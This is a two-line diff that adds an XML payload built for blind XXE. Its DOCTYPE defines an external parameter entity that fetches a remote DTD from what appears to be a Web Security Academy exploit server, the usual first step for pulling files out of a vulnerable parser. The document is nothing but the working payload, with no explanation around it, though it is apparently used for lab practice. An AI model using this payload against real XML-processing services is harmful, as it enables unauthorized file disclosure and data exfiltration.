@@ -1,0 +1,2 @@
+<?xml version="1.0"?>
+<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "https://exploit-ac311fd81ef6721480dda71701570045.web-security-academy.net/exploit"> %xxe;]>
